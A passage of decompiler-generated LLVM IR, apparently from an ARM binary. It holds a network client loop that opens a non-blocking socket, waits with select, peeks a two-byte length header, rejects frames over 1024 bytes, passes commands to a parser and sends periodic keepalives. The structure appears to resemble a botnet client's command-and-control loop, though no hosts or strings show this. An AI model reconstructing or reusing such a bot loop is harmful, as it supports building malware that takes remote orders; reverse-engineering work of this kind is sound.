  %v2_d9cc = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_d9cc, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_d9d4 = call i32 @function_101b4()
  %v0_d9d8 = load i32, i32* @r6, align 4
  %v7_d9d8 = icmp eq i32 %v0_d9d8, 2
  br i1 %v7_d9d8, label %dec_label_pc_db10, label %dec_label_pc_d9e0

dec_label_pc_d9e0:                                ; preds = %dec_label_pc_db10, %dec_label_pc_d92c, %dec_label_pc_db20
  %v0_d9e0 = call i32 @function_e094()
  store i32 %v0_d9e0, i32* @r6, align 4
  %v0_d9e8 = load i32, i32* @r8, align 4
  %v1_d9e8 = inttoptr i32 %v0_d9e8 to i32*
  %v2_d9e8 = load i32, i32* %v1_d9e8, align 4
  %v1_d9ec = inttoptr i32 %v2_d9e8 to i8*
  %v2_d9ec = call i32 @function_10120(i8* %v1_d9ec)
  %v0_d9f4 = load i32, i32* @r8, align 4
  %v1_d9f4 = inttoptr i32 %v0_d9f4 to i32*
  %v2_d9f4 = load i32, i32* %v1_d9f4, align 4
  %v1_d9f8 = inttoptr i32 %v2_d9f4 to i8*
  %v2_d9f8 = call i32 @function_10120(i8* %v1_d9f8)
  %v1_d9fc = sub i32 20, %v2_d9ec
  store i32 %v2_d9f8, i32* @r4, align 4
  %v0_da04 = load i32, i32* @r6, align 4
  %v2_da08 = call i32 @function_10778(i32 %v0_da04, i32 %v1_d9fc)
  %v2_da10 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_da10, i32* @r5, align 4
  %v0_da14 = load i32, i32* @r4, align 4
  %v2_da14 = add i32 %v0_da14, %v1_d9fc
  store i32 %v2_da14, i32* @r4, align 4
  %v2_da20 = call i32 @function_e158(i32 %v2_da10, i32 %v2_da14)
  %v2_da28 = ptrtoint i32* %stack_var_-40 to i32
  %v1_da2c = load i32, i32* @r4, align 4
  %v2_da2c = add i32 %v1_da2c, %v2_da28
  store i32 %v2_da2c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  %v0_da38 = load i32, i32* @r8, align 4
  %v1_da38 = inttoptr i32 %v0_da38 to i32*
  %v2_da38 = load i32, i32* %v1_da38, align 4
  store i32 %v2_da38, i32* @r0, align 4
  %v3_da3c = add i32 %v2_da2c, -64
  %v4_da3c = inttoptr i32 %v3_da3c to i8*
  store i8 0, i8* %v4_da3c, align 1
  %v2_da40 = inttoptr i32 %v2_da38 to i8*
  %v3_da40 = call i32 @function_10148(i8* %v2_da40, i32 %v2_da10)
  store i32 32, i32* @r1, align 4
  store i32 %v2_da10, i32* @r0, align 4
  %v0_da4c = call i32 @function_101b4()
  %v0_da50 = call i32 @function_e094()
  store i32 %v0_da50, i32* @r7, align 4
  %v0_da58 = load i32, i32* @r8, align 4
  %v1_da58 = inttoptr i32 %v0_da58 to i32*
  %v2_da58 = load i32, i32* %v1_da58, align 4
  %v1_da5c = inttoptr i32 %v2_da58 to i8*
  %v2_da5c = call i32 @function_10120(i8* %v1_da5c)
  store i32 %v2_da5c, i32* @r6, align 4
  %v0_da64 = load i32, i32* @r8, align 4
  %v1_da64 = inttoptr i32 %v0_da64 to i32*
  %v2_da64 = load i32, i32* %v1_da64, align 4
  %v1_da68 = inttoptr i32 %v2_da64 to i8*
  %v2_da68 = call i32 @function_10120(i8* %v1_da68)
  %v0_da6c = load i32, i32* @r6, align 4
  %v1_da6c = sub i32 20, %v0_da6c
  store i32 %v2_da68, i32* @r4, align 4
  %v0_da74 = load i32, i32* @r7, align 4
  %v2_da78 = call i32 @function_10778(i32 %v0_da74, i32 %v1_da6c)
  %v0_da7c = load i32, i32* @r4, align 4
  %v2_da7c = add i32 %v0_da7c, %v1_da6c
  store i32 %v2_da7c, i32* @r4, align 4
  %v2_da88 = call i32 @function_e158(i32 %v2_da10, i32 %v2_da7c)
  store i32 %v2_da28, i32* %r2.global-to-local, align 4
  %v1_da94 = load i32, i32* @r4, align 4
  %v2_da94 = add i32 %v1_da94, %v2_da28
  store i32 %v2_da94, i32* %r3.global-to-local, align 4
  %v0_da98 = load i32, i32* @sb, align 4
  %v1_da98 = trunc i32 %v0_da98 to i8
  %v3_da98 = add i32 %v2_da94, -64
  %v4_da98 = inttoptr i32 %v3_da98 to i8*
  store i8 %v1_da98, i8* %v4_da98, align 1
  %v4_daa4 = call i32 @function_10890(i32 15, i32 %v2_da10, i32 %v2_da28, i32 %v2_da94)
  %v1_daac = call i32 @function_fd40(i32 3)
  %v3_dab8 = call i32 @function_fc7c(i32 3, i32* nonnull %stack_var_-48)
  %v3_dabc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_dabc, i32* %r2.global-to-local, align 4
  %v2_dac8 = call i32 @function_10aec(i32 1, i32 %v3_dab8)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_dad8 = call i32 @function_10aec(i32 1, i32 ptrtoint (i32* @global_var_15f60.88 to i32))
  %v1_dae0 = call i32 @function_fca0(i32 3)
  %v1_dae4 = call i32 @function_85e0(i32 %v1_dae0)
  %v1_dae8 = call i32 @function_ced0(i32 %v1_dae4)
  store i32 %v1_dae8, i32* @r0, align 4
  %v1_daec = call i32 @function_d83c(i32 %v1_dae8)
  store i32 %v1_daec, i32* @r0, align 4
  %v0_daf0 = call i32 @function_108d0()
  %v1_daf4 = load i32, i32* @sb, align 4
  %v7_daf8 = icmp sgt i32 %v0_daf0, %v1_daf4
  br i1 %v7_daf8, label %dec_label_pc_dafc, label %dec_label_pc_db4c

dec_label_pc_dafc:                                ; preds = %dec_label_pc_d9e0
  store i32 %v15_d92c, i32* %r8.global-to-local, align 4
  ret i32 %v1_daf4

dec_label_pc_db10:                                ; preds = %dec_label_pc_d92c
  %v0_db10 = load i32, i32* @r8, align 4
  %v1_db10 = add i32 %v0_db10, 4
  %v2_db10 = inttoptr i32 %v1_db10 to i32*
  %v3_db10 = load i32, i32* %v2_db10, align 4
  %v1_db14 = inttoptr i32 %v3_db10 to i8*
  %v2_db14 = call i32 @function_10120(i8* %v1_db14)
  %v8_db1c = icmp sgt i32 %v2_db14, 31
  br i1 %v8_db1c, label %dec_label_pc_d9e0, label %dec_label_pc_db20

dec_label_pc_db20:                                ; preds = %dec_label_pc_db10
  %v0_db24 = load i32, i32* @r8, align 4
  %v1_db24 = add i32 %v0_db24, 4
  %v2_db24 = inttoptr i32 %v1_db24 to i32*
  %v3_db24 = load i32, i32* %v2_db24, align 4
  store i32 %v2_d9cc, i32* @r0, align 4
  %v2_db2c = bitcast i32* %stack_var_-136 to i8*
  %v3_db2c = call i32 @function_10148(i8* %v2_db2c, i32 %v3_db24)
  %v0_db30 = load i32, i32* @r8, align 4
  %v1_db30 = add i32 %v0_db30, 4
  %v2_db30 = inttoptr i32 %v1_db30 to i32*
  %v3_db30 = load i32, i32* %v2_db30, align 4
  %v1_db38 = inttoptr i32 %v3_db30 to i8*
  %v2_db38 = call i32 @function_10120(i8* %v1_db38)
  store i32 %v2_db38, i32* @r1, align 4
  store i32 %v3_db30, i32* @r0, align 4
  %v0_db44 = call i32 @function_101b4()
  br label %dec_label_pc_d9e0

dec_label_pc_db4c:                                ; preds = %dec_label_pc_d9e0
  %v1_db4c = call i32 @function_10b20(i32 %v0_daf0)
  %v0_db50 = load i32, i32* @sb, align 4
  %v1_db54 = call i32 @function_10be0(i32 %v0_db50)
  %v1_db5c = call i32 @function_10be0(i32 1)
  %v1_db64 = call i32 @function_10be0(i32 2)
  %v1_db68 = call i32 @function_85e0(i32 %v1_db64)
  %v1_db6c = call i32 @function_ced0(i32 %v1_db68)
  store i32 %v1_db6c, i32* @r0, align 4
  %v1_db70 = call i32 @function_d83c(i32 %v1_db6c)
  store i32 %v1_db70, i32* @r0, align 4
  %v1_db74 = call i32 @function_e52c(i32 %v1_db70)
  store i32 124204, i32* @fp, align 4
  store i32 124208, i32* @sl, align 4
  %v2_db88 = ptrtoint i32* %stack_var_-264 to i32
  store i32 %v2_db88, i32* @r6, align 4
  %v2_db8c = ptrtoint i32* %stack_var_-392 to i32
  store i32 %v2_db8c, i32* @r7, align 4
  %v2_dc6c = ptrtoint i32* %stack_var_-72 to i32
  %v2_dcb4 = ptrtoint i32* %stack_var_-144 to i32
  %v2_df7c = ptrtoint i8** %stack_var_-42 to i32
  %v2_de14 = ptrtoint i32* %stack_var_-1416 to i32
  %v2_df0c = ptrtoint i32* %stack_var_-52 to i32
  %v2_df10 = ptrtoint i32* %stack_var_-56 to i32
  %v1_dfcc = bitcast i32* %stack_var_-136 to i8*
  br label %dec_label_pc_db90

dec_label_pc_db90:                                ; preds = %dec_label_pc_df90, %dec_label_pc_dfc4, %bb44, %dec_label_pc_de2c, %dec_label_pc_dd70, %dec_label_pc_dd60, %bb41, %dec_label_pc_e04c, %dec_label_pc_e030, %dec_label_pc_e018, %dec_label_pc_dfa0, %dec_label_pc_df38, %dec_label_pc_de84, %dec_label_pc_dd14, %dec_label_pc_db4c
  store i32 0, i32* %stack_var_-264, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_db9c

dec_label_pc_db9c:                                ; preds = %dec_label_pc_db9c, %dec_label_pc_db90
  %v1_dba0 = phi i32 [ %v1_dba4, %dec_label_pc_db9c ], [ 4, %dec_label_pc_db90 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_dba0 = load i32, i32* @r6, align 4
  %v3_dba0 = add i32 %v2_dba0, %v1_dba0
  %v4_dba0 = inttoptr i32 %v3_dba0 to i32*
  store i32 0, i32* %v4_dba0, align 4
  %v0_dba4 = load i32, i32* %r3.global-to-local, align 4
  %v1_dba4 = add i32 %v0_dba4, 4
  store i32 %v1_dba4, i32* %r3.global-to-local, align 4
  %v7_dba8 = icmp eq i32 %v1_dba4, 128
  br i1 %v7_dba8, label %dec_label_pc_dbb0, label %dec_label_pc_db9c

dec_label_pc_dbb0:                                ; preds = %dec_label_pc_db9c
  %v0_dbb0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_dbb0, i32* %stack_var_-392, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dbb8

dec_label_pc_dbb8:                                ; preds = %dec_label_pc_dbb8, %dec_label_pc_dbb0
  %v1_dbbc = phi i32 [ %v1_dbc0, %dec_label_pc_dbb8 ], [ 4, %dec_label_pc_dbb0 ]
  store i32 0, i32* @r4, align 4
  %v2_dbbc = load i32, i32* @r7, align 4
  %v3_dbbc = add i32 %v2_dbbc, %v1_dbbc
  %v4_dbbc = inttoptr i32 %v3_dbbc to i32*
  store i32 0, i32* %v4_dbbc, align 4
  %v0_dbc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_dbc0 = add i32 %v0_dbc0, 4
  store i32 %v1_dbc0, i32* %r3.global-to-local, align 4
  %v7_dbc4 = icmp eq i32 %v1_dbc0, 128
  br i1 %v7_dbc4, label %dec_label_pc_dbcc, label %dec_label_pc_dbb8

dec_label_pc_dbcc:                                ; preds = %dec_label_pc_dbb8
  %v0_dbcc = load i32, i32* @fp, align 4
  %v1_dbcc = inttoptr i32 %v0_dbcc to i32*
  %v2_dbcc = load i32, i32* %v1_dbcc, align 4
  %v7_dbd0 = icmp eq i32 %v2_dbcc, -1
  br i1 %v7_dbd0, label %dec_label_pc_dc00, label %dec_label_pc_dbd8

dec_label_pc_dbd8:                                ; preds = %dec_label_pc_dbcc
  %v3_dbd8 = udiv i32 %v2_dbcc, 32
  %v3_dbe0 = mul nuw nsw i32 %v3_dbd8, 4
  store i32 %v2_da28, i32* %ip.global-to-local, align 4
  %v2_dbe8 = add i32 %v3_dbe0, %v2_da28
  store i32 %v2_dbe8, i32* %r3.global-to-local, align 4
  %v1_dbec = add i32 %v2_dbe8, -224
  %v2_dbec = inttoptr i32 %v1_dbec to i32*
  %v3_dbec = load i32, i32* %v2_dbec, align 4
  %v1_dbf0 = urem i32 %v2_dbcc, 32
  %v7_dbf8 = shl i32 1, %v1_dbf0
  %v8_dbf8 = or i32 %v3_dbec, %v7_dbf8
  store i32 %v8_dbf8, i32* %r2.global-to-local, align 4
  store i32 %v8_dbf8, i32* %v2_dbec, align 4
  br label %dec_label_pc_dc00

dec_label_pc_dc00:                                ; preds = %dec_label_pc_dbcc, %dec_label_pc_dbd8
  %v0_dc00 = load i32, i32* @sl, align 4
  %v1_dc00 = inttoptr i32 %v0_dc00 to i32*
  %v2_dc00 = load i32, i32* %v1_dc00, align 4
  store i32 %v2_dc00, i32* @r3, align 4
  %v7_dc04 = icmp eq i32 %v2_dc00, -1
  store i32 124208, i32* %r8.global-to-local, align 4
  br i1 %v7_dc04, label %dec_label_pc_de90, label %dec_label_pc_dc10

dec_label_pc_dc10:                                ; preds = %dec_label_pc_de90, %dec_label_pc_dc00, %bb43
  %v2_dc14 = load i8, i8* bitcast (i8** @global_var_1e704.92 to i8*), align 4
  %v3_dc14 = zext i8 %v2_dc14 to i32
  store i32 %v3_dc14, i32* %r3.global-to-local, align 4
  %v2_dc18 = icmp eq i8 %v2_dc14, 0
  %v0_dd30 = load i32, i32* @sl, align 4
  %v1_dd30 = inttoptr i32 %v0_dd30 to i32*
  %v2_dd30 = load i32, i32* %v1_dd30, align 4
  store i32 %v2_dd30, i32* %ip.global-to-local, align 4
  %v3_dd38 = udiv i32 %v2_dd30, 32
  br i1 %v2_dc18, label %dec_label_pc_dd30, label %dec_label_pc_dc20

dec_label_pc_dc20:                                ; preds = %dec_label_pc_dc10
  %v3_dc30 = mul nuw nsw i32 %v3_dd38, 4
  %v2_dc34 = add i32 %v3_dc30, %v2_da28
  store i32 %v2_dc34, i32* %r3.global-to-local, align 4
  %v1_dc38 = add i32 %v2_dc34, -352
  %v2_dc38 = inttoptr i32 %v1_dc38 to i32*
  %v3_dc38 = load i32, i32* %v2_dc38, align 4
  %v1_dc3c = urem i32 %v2_dd30, 32
  %v7_dc44 = shl i32 1, %v1_dc3c
  %v8_dc44 = or i32 %v3_dc38, %v7_dc44
  store i32 %v8_dc44, i32* %r2.global-to-local, align 4
  store i32 %v8_dc44, i32* %v2_dc38, align 4
  br label %dec_label_pc_dc4c

dec_label_pc_dc4c:                                ; preds = %dec_label_pc_dd30, %dec_label_pc_dc20
  %v0_dc4c = load i32, i32* @fp, align 4
  %v1_dc4c = inttoptr i32 %v0_dc4c to i32*
  %v2_dc4c = load i32, i32* %v1_dc4c, align 4
  %v0_dc50 = load i32, i32* %ip.global-to-local, align 4
  %v5_dc54 = icmp slt i32 %v0_dc50, %v2_dc4c
  br i1 %v5_dc54, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_dc4c
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_dc4c, %bb
  %v0_dc70 = phi i32 [ %v2_dc4c, %dec_label_pc_dc4c ], [ %v0_dc50, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  store i32 %v2_dc6c, i32* %ip.global-to-local, align 4
  %v1_dc70 = add i32 %v0_dc70, 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_db8c, i32* %r2.global-to-local, align 4
  %v5_dc88 = call i32 @function_10904(i32 %v1_dc70, i32 %v2_db88, i32 %v2_db8c, i32 0, i32 %v2_dc6c)
  %v8_dc8c = icmp eq i32 %v5_dc88, -1
  br i1 %v8_dc8c, label %dec_label_pc_db90, label %dec_label_pc_dc94

dec_label_pc_dc94:                                ; preds = %bb41
  %v6_dc88 = trunc i32 %v5_dc88 to i16
  %v3_dc94 = icmp eq i16 %v6_dc88, 0
  br i1 %v3_dc94, label %dec_label_pc_dc9c, label %dec_label_pc_dcc8

dec_label_pc_dc9c:                                ; preds = %dec_label_pc_dc94
  %v2_dca0 = load i32, i32* @sb, align 4
  %v5_dca4 = srem i32 %v2_dca0, 6
  %v4_dcac = sub i32 %v2_dca0, %v5_dca4
  store i32 %v4_dcac, i32* %r3.global-to-local, align 4
  store i32 %v5_dca4, i32* %r2.global-to-local, align 4
  %v2_dcb8 = icmp eq i32 %v5_dca4, 0
  %v7_dcbc = inttoptr i32 %v5_dc88 to i8*
  store i8* %v7_dcbc, i8** %stack_var_-42, align 4
  %v1_dcc0 = add i32 %v2_dca0, 1
  store i32 %v1_dcc0, i32* @sb, align 4
  br i1 %v2_dcb8, label %dec_label_pc_df74, label %dec_label_pc_dcc8

dec_label_pc_dcc8:                                ; preds = %dec_label_pc_dc94, %dec_label_pc_dc9c, %dec_label_pc_df74
  store i32 ptrtoint (i8** @global_var_1e704.92 to i32), i32* %r2.global-to-local, align 4
  %v2_dccc = load i8, i8* bitcast (i8** @global_var_1e704.92 to i8*), align 4
  %v3_dccc = zext i8 %v2_dccc to i32
  store i32 %v3_dccc, i32* @r4, align 4
  %v2_dcd0 = icmp eq i8 %v2_dccc, 0
  %v0_dd60 = load i32, i32* @sl, align 4
  %v1_dd60 = inttoptr i32 %v0_dd60 to i32*
  %v2_dd60 = load i32, i32* %v1_dd60, align 4
  br i1 %v2_dcd0, label %dec_label_pc_dd60, label %dec_label_pc_dcd8

dec_label_pc_dcd8:                                ; preds = %dec_label_pc_dcc8
  %v3_dce0 = udiv i32 %v2_dd60, 32
  store i32 %v2_da28, i32* %ip.global-to-local, align 4
  %v3_dce8 = mul nuw nsw i32 %v3_dce0, 4
  %v2_dcec = add i32 %v3_dce8, %v2_da28
  store i32 %v2_dcec, i32* %r3.global-to-local, align 4
  %v1_dcf0 = add i32 %v2_dcec, -352
  %v2_dcf0 = inttoptr i32 %v1_dcf0 to i32*
  %v3_dcf0 = load i32, i32* %v2_dcf0, align 4
  %v1_dcf4 = urem i32 %v2_dd60, 32
  %v6_dcf8 = lshr i32 %v3_dcf0, %v1_dcf4
  store i32 %v6_dcf8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1e704.92 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_dd04 = urem i32 %v6_dcf8, 2
  %v2_dd04 = icmp eq i32 %v1_dd04, 0
  store i8 0, i8* bitcast (i8** @global_var_1e704.92 to i8*), align 4
  store i32 124208, i32* @r4, align 4
  br i1 %v2_dd04, label %dec_label_pc_dd14, label %dec_label_pc_df00

dec_label_pc_dd14:                                ; preds = %dec_label_pc_dcd8
  store i32 56604, i32* @lr, align 4
  %v1_dd18 = icmp ne i32 %v2_dd60, -1
  call void @__pseudo_cond_branch(i1 %v1_dd18, i32 ptrtoint (i32* @global_var_10be0.94 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dd20 = load i32, i32* @r4, align 4
  %v2_dd20 = inttoptr i32 %v1_dd20 to i32*
  store i32 -1, i32* %v2_dd20, align 4
  %v1_dd28 = call i32 @function_12cc8(i32 1)
  br label %dec_label_pc_db90

dec_label_pc_dd30:                                ; preds = %dec_label_pc_dc10
  store i32 %v2_da28, i32* %r2.global-to-local, align 4
  %v3_dd40 = mul nuw nsw i32 %v3_dd38, 4
  %v2_dd44 = add i32 %v3_dd40, %v2_da28
  store i32 %v2_dd44, i32* %r3.global-to-local, align 4
  %v1_dd48 = add i32 %v2_dd44, -224
  %v2_dd48 = inttoptr i32 %v1_dd48 to i32*
  %v3_dd48 = load i32, i32* %v2_dd48, align 4
  %v1_dd4c = urem i32 %v2_dd30, 32
  %v7_dd54 = shl i32 1, %v1_dd4c
  %v8_dd54 = or i32 %v3_dd48, %v7_dd54
  store i32 %v8_dd54, i32* %r2.global-to-local, align 4
  store i32 %v8_dd54, i32* %v2_dd48, align 4
  br label %dec_label_pc_dc4c

dec_label_pc_dd60:                                ; preds = %dec_label_pc_dcc8
  %v7_dd64 = icmp eq i32 %v2_dd60, -1
  store i32 124208, i32* @r8, align 4
  br i1 %v7_dd64, label %dec_label_pc_db90, label %dec_label_pc_dd70

dec_label_pc_dd70:                                ; preds = %dec_label_pc_dd60
  %v3_dd70 = udiv i32 %v2_dd60, 32
  %v3_dd78 = mul nuw nsw i32 %v3_dd70, 4
  store i32 %v2_da28, i32* %ip.global-to-local, align 4
  %v2_dd80 = add i32 %v3_dd78, %v2_da28
  store i32 %v2_dd80, i32* %r3.global-to-local, align 4
  %v1_dd84 = add i32 %v2_dd80, -224
  %v2_dd84 = inttoptr i32 %v1_dd84 to i32*
  %v3_dd84 = load i32, i32* %v2_dd84, align 4
  %v1_dd88 = urem i32 %v2_dd60, 32
  %v6_dd8c = lshr i32 %v3_dd84, %v1_dd88
  store i32 %v6_dd8c, i32* %r2.global-to-local, align 4
  %v1_dd90 = urem i32 %v6_dd8c, 2
  %v2_dd90 = icmp eq i32 %v1_dd90, 0
  br i1 %v2_dd90, label %dec_label_pc_db90, label %dec_label_pc_dd98

dec_label_pc_dd98:                                ; preds = %dec_label_pc_dd70
  %v6_dd9c = inttoptr i32 %v3_dccc to i8*
  store i8* %v6_dd9c, i8** %stack_var_-42, align 4
  %v0_dda0 = call i32 @function_11008()
  %v0_dda4 = load i32, i32* @r4, align 4
  %v2_dda4 = inttoptr i32 %v0_dda0 to i32*
  store i32 %v0_dda4, i32* %v2_dda4, align 4
  store i32 %v0_dda0, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_ddb8 = load i32, i32* @r8, align 4
  %v1_ddb8 = inttoptr i32 %v0_ddb8 to i32*
  %v2_ddb8 = load i32, i32* %v1_ddb8, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_ddc4 = call i32 @function_1128c(i32 %v2_ddb8, i32 %v2_df7c, i32 2, i32 16386)
  %v7_ddc8 = icmp eq i32 %v4_ddc4, -1
  br i1 %v7_ddc8, label %dec_label_pc_df90, label %dec_label_pc_ddd0

dec_label_pc_ddd0:                                ; preds = %dec_label_pc_dd98
  %v2_ddd0 = icmp eq i32 %v4_ddc4, 0
  br i1 %v2_ddd0, label %dec_label_pc_dfa0, label %dec_label_pc_ddd8

dec_label_pc_ddd8:                                ; preds = %dec_label_pc_ddd0
  %v3_dddc = load i8*, i8** %stack_var_-42, align 4
  %v4_dddc = ptrtoint i8* %v3_dddc to i32
  store i32 %v4_dddc, i32* %r3.global-to-local, align 4
  %v2_dde0 = icmp eq i8* %v3_dddc, null
  br i1 %v2_dde0, label %dec_label_pc_e030, label %dec_label_pc_dde8

dec_label_pc_dde8:                                ; preds = %dec_label_pc_ddd8
  %v3_dde8 = udiv i32 %v4_dddc, 256
  %v1_ddec = mul i32 %v4_dddc, 256
  %v4_ddf0 = and i32 %v1_ddec, 65280
  %v5_ddf0 = or i32 %v4_ddf0, %v3_dde8
  %v6_ddf0 = trunc i32 %v5_ddf0 to i16
  store i32 %v5_ddf0, i32* %r2.global-to-local, align 4
  store i32 %v2_dcb4, i32* %r3.global-to-local, align 4
  %v7_ddfc = inttoptr i32 %v5_ddf0 to i8*
  store i8* %v7_ddfc, i8** %stack_var_-42, align 4
  %tmp45 = icmp ugt i16 %v6_ddf0, 1024
  br i1 %tmp45, label %dec_label_pc_e04c, label %dec_label_pc_de04

dec_label_pc_de04:                                ; preds = %dec_label_pc_dde8
  %v0_de04 = load i32, i32* @r4, align 4
  %v1_de04 = load i32, i32* @r5, align 4
  %v2_de04 = inttoptr i32 %v1_de04 to i32*
  store i32 %v0_de04, i32* %v2_de04, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_de10 = load i32, i32* @r8, align 4
  %v1_de10 = inttoptr i32 %v0_de10 to i32*
  %v2_de10 = load i32, i32* %v1_de10, align 4
  %v7_de18 = call i32 @function_1128c(i32 %v2_de10, i32 %v2_de14, i32 %v5_ddf0, i32 16386)
  %v7_de1c = icmp eq i32 %v7_de18, -1
  br i1 %v7_de1c, label %dec_label_pc_df90, label %dec_label_pc_de24

dec_label_pc_de24:                                ; preds = %dec_label_pc_de04
  %v2_de24 = icmp eq i32 %v7_de18, 0
  br i1 %v2_de24, label %dec_label_pc_dfa0, label %dec_label_pc_de2c

dec_label_pc_de2c:                                ; preds = %dec_label_pc_de24
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_de3c = load i32, i32* @r8, align 4
  %v1_de3c = inttoptr i32 %v0_de3c to i32*
  %v2_de3c = load i32, i32* %v1_de3c, align 4
  %v4_de40 = call i32 @function_1128c(i32 %v2_de3c, i32 %v2_df7c, i32 2, i32 16384)
  %v3_de48 = load i8*, i8** %stack_var_-42, align 4
  %v4_de48 = ptrtoint i8* %v3_de48 to i32
  %v3_de4c = udiv i32 %v4_de48, 256
  %v1_de50 = urem i32 %v4_de48, 256
  store i32 %v1_de50, i32* %r3.global-to-local, align 4
  %v4_de54 = mul nuw nsw i32 %v1_de50, 256
  %v5_de54 = or i32 %v4_de54, %v3_de4c
  store i32 %v5_de54, i32* %ip.global-to-local, align 4
  store i32 %v2_dcb4, i32* @lr, align 4
  store i32 %v5_de54, i32* %r2.global-to-local, align 4
  %v0_de64 = load i32, i32* @r8, align 4
  %v1_de64 = inttoptr i32 %v0_de64 to i32*
  %v2_de64 = load i32, i32* %v1_de64, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_de6c = inttoptr i32 %v5_de54 to i8*
  store i8* %v6_de6c, i8** %stack_var_-42, align 4
  %v6_de70 = call i32 @function_1128c(i32 %v2_de64, i32 %v2_de14, i32 %v5_de54, i32 16384)
  store i32 %v2_dcb4, i32* %r2.global-to-local, align 4
  %v3_de78 = load i8*, i8** %stack_var_-42, align 4
  %v3_de7c = icmp eq i8* %v3_de78, null
  br i1 %v3_de7c, label %dec_label_pc_db90, label %dec_label_pc_de84

dec_label_pc_de84:                                ; preds = %dec_label_pc_de2c
  %v4_de78 = ptrtoint i8* %v3_de78 to i32
  %v5_de88 = call i32 @function_82e8(i32* nonnull %stack_var_-1416, i32 %v4_de78, i32 %v2_dcb4)
  br label %dec_label_pc_db90

dec_label_pc_de90:                                ; preds = %dec_label_pc_dc00
  %v0_de98 = load i32, i32* @r4, align 4
  store i32 %v0_de98, i32* %r2.global-to-local, align 4
  %v3_de9c = call i32 @function_113bc(i32 2, i32 1, i32 %v0_de98)
  %v7_dea0 = icmp eq i32 %v3_de9c, -1
  store i32 %v3_de9c, i32* @r5, align 4
  %v1_dea8 = load i32, i32* %r8.global-to-local, align 4
  %v2_dea8 = inttoptr i32 %v1_dea8 to i32*
  store i32 %v3_de9c, i32* %v2_dea8, align 4
  br i1 %v7_dea0, label %dec_label_pc_dc10, label %dec_label_pc_deb0

dec_label_pc_deb0:                                ; preds = %dec_label_pc_de90
  %v0_deb0 = load i32, i32* @r4, align 4
  store i32 %v0_deb0, i32* %r2.global-to-local, align 4
  %v2_deb8 = call i32 @function_10a14(i32 %v3_de9c, i32 3)
  %v1_dec0 = or i32 %v2_deb8, 2048
  store i32 %v1_dec0, i32* %r2.global-to-local, align 4
  %v0_dec4 = load i32, i32* @r5, align 4
  %v2_dec8 = call i32 @function_10a14(i32 %v0_dec4, i32 4)
  %v2_ded0 = load i32, i32* inttoptr (i32 124212 to i32*), align 4
  store i32 %v2_ded0, i32* %r3.global-to-local, align 4
  %v2_ded4 = icmp eq i32 %v2_ded0, 0
  br i1 %v2_ded4, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_deb0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_deb0, %bb42
  %v2_dedc = xor i1 %v2_ded4, true
  call void @__pseudo_cond_branch(i1 %v2_dedc, i32 %v2_ded0)
  store i32 ptrtoint (i8** @global_var_1e704.92 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_dee8 = load i32, i32* %r8.global-to-local, align 4
  %v1_dee8 = inttoptr i32 %v0_dee8 to i32*
  %v2_dee8 = load i32, i32* %v1_dee8, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1e704.92 to i8*), align 4
  %v4_def8 = call i32 @function_111a4(i32 %v2_dee8, i32 ptrtoint (i16** @global_var_2078c.76 to i32), i32 16)
  br label %dec_label_pc_dc10

dec_label_pc_df00:                                ; preds = %dec_label_pc_dcd8
  store i32 4, i32* @r5, align 4
  store i32 %v2_df0c, i32* %r3.global-to-local, align 4
  store i32 %v2_df10, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_df28 = call i32 @function_11214(i32 %v2_dd60, i32 1, i32 4, i32 %v2_df0c, i32 %v2_df10)
  %v3_df2c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_df2c, i32* %r3.global-to-local, align 4
  %v2_df30 = icmp eq i32 %v3_df2c, 0
  br i1 %v2_df30, label %dec_label_pc_dfc4, label %dec_label_pc_df38

dec_label_pc_df38:                                ; preds = %dec_label_pc_df00
  %v0_df38 = load i32, i32* @r4, align 4
  %v1_df38 = inttoptr i32 %v0_df38 to i32*
  %v2_df38 = load i32, i32* %v1_df38, align 4
  %v1_df3c = call i32 @function_10be0(i32 %v2_df38)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_df44 = load i32, i32* @r4, align 4
  %v2_df44 = inttoptr i32 %v1_df44 to i32*
  store i32 -1, i32* %v2_df44, align 4
  %v0_df48 = call i32 @function_e094()
  %v3_df50 = zext i32 %v0_df48 to i64
  %v4_df50 = mul nuw i64 %v3_df50, 3435973837
  %v3_df541 = udiv i64 %v4_df50, 34359738368
  %v3_df583 = mul nuw nsw i64 %v3_df541, 8
  %v3_df58 = trunc i64 %v3_df583 to i32
  store i32 %v3_df58, i32* %r2.global-to-local, align 4
  %v2_df5c5 = mul nuw nsw i64 %v3_df541, 2
  %v2_df5c = trunc i64 %v2_df5c5 to i32
  %v2_df60 = add i32 %v3_df58, %v2_df5c
